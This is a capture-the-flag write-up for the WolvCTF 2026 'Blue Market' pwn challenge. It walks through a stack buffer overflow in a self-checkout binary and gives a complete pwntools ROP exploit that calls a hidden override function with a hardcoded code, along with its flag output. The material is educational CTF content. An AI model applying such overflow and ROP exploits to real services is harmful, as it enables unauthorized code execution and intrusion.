---
title: Blue Market
challenge_type: Pwn
difficulty: Easy
author: 0xir0nroot
writeup_author: "@xabito"
competition: wolvctf-2026
summary: |-
  The Blue Market self-checkout has a manager override for voiding transactions. Shame the code's hardcoded.
connections:
  - url: blue-market.wolvctf-2026.kctf.cloud:1337
attachments:
  - title: dis.tar.gz
    url: /assets/files/wolvctf-2026/blue-market/dis.tar.gz
---

## Recon

We extracted the single `chal` binary from `dis.tar.gz`.

```bash
$ file chal
chal: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ checksec --file=chal
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

With no PIE and no canary, every symbol has a fixed address and the saved return address is unprotected. The binary is small and
not stripped, so `objdump` showed the two functions we needed. The first is a
helper:

```console
$ objdump -d chal
0000000000401182 <restock_helper>:
  401182:  pop rdi
  401183:  ret
```

The `restock_helper` symbol consists of `pop rdi; ret`, giving us control of the
first argument. The second function is the manager override:

```asm
0000000000401184 <managerOverride>:
  40118f:  mov    qword ptr [rbp-0x138], rdi   ; save argument
  4011af:  xor    rax, 0xc0ffee                ; key = arg ^ 0xc0ffee
   ...
  401201:  cmp    qword ptr [rbp-0x138], 0xc0ffee
  40120c:  je     0x40121a
  40121a:  call   fopen("flag.txt", "r")       ; correct code -> print flag
  401280:  call   exit(0)
```

`managerOverride` compares its first argument against the constant `0xc0ffee`. If
it matches, the function opens `flag.txt` and prints it. The hardcoded code is
therefore the magic value in the comparison. Normal execution never calls this
function, so we needed to redirect execution to it.

## Exploitation

The bug is in `checkout`, which reads more data than its buffer can hold:

```asm
0000000000401287 <checkout>:
  40128b:  sub    rsp, 0x40
   ...
  4012a3:  lea    rax, [rbp-0x40]    ; 64-byte local buffer
  4012a7:  mov    edx, 0x100          ; ...but read up to 256 bytes
  4012b4:  call   read@plt
  4012c5:  ret
```

The `read` accepts `0x100` bytes for a `0x40`-byte buffer. Since the buffer is at
`rbp-0x40`, 64 bytes fill it, 8 more overwrite the saved `rbp`, and the return
address starts at offset **72**. We use return-oriented programming (ROP): the
overwritten saved return address chains together existing `ret`-ending code
gadgets. Our chain uses `pop rdi; ret` to load `0xc0ffee` before entering
`managerOverride`.

Entering `managerOverride` through the ROP chain misaligns the stack for `fopen`,
causing a fault in glibc. Inserting the bare `ret` at `0x401183` moves the stack
by 8 bytes and restores the required alignment.

The payload order is:

```text
72 padding bytes | 0x401183 (ret) | 0x401182 (pop rdi; ret) | 0xc0ffee | 0x401184 (managerOverride)
```

We validated the payload locally in an `amd64` Docker container without a
`flag.txt` present. It printed `flag.txt missing` from the `fopen`-failure branch
inside `managerOverride`, confirming that the return address was hijacked, the
alignment gadget prevented a crash, and the `0xc0ffee` check passed.

## Flag capture

We then ran the same payload against the remote service with this script:

```python
import sys
from pwn import *

context.arch = 'amd64'

POP_RDI_RET = 0x401182   # restock_helper: pop rdi; ret
RET_GADGET  = 0x401183   # bare ret (stack alignment)
WIN         = 0x401184   # managerOverride(rdi)
CODE        = 0xc0ffee   # hardcoded override code
OFFSET      = 72

payload  = b'A' * OFFSET
payload += p64(RET_GADGET)
payload += p64(POP_RDI_RET)
payload += p64(CODE)
payload += p64(WIN)

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    io = remote('blue-market.wolvctf-2026.kctf.cloud', 1337)
else:
    io = process('./chal')

io.recvuntil(b'Scan an item (enter item code): ')
io.send(payload)
print(io.recvall(timeout=5).decode(errors='replace'))
```

```bash
$ python exploit.py remote
[+] Opening connection to blue-market.wolvctf-2026.kctf.cloud on port 1337: Done
Item not recognized. Please see an attendant.
Override accepted. wctf{bluem4rket_4qtb786aidwh1etd}
```
